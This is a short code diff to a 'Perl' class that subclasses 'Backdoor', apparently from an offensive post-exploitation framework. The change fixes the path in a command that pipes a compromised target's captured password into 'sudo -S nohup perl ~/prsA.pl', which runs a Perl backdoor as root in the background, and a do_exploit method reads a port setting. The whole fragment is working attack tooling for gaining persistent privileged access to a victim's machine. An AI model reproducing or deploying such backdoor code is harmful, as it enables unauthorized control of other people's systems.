@@ -14,7 +14,7 @@ class Perl(Backdoor):
         self.modules = {} 
     
     def get_command(self):
-        return "echo " + self.core.curtarget.pword + " | sudo -S nohup perl prsA.pl"
+        return "echo " + self.core.curtarget.pword + " | sudo -S nohup perl ~/prsA.pl"
 
     def do_exploit(self, args):
         port = self.get_value("port")
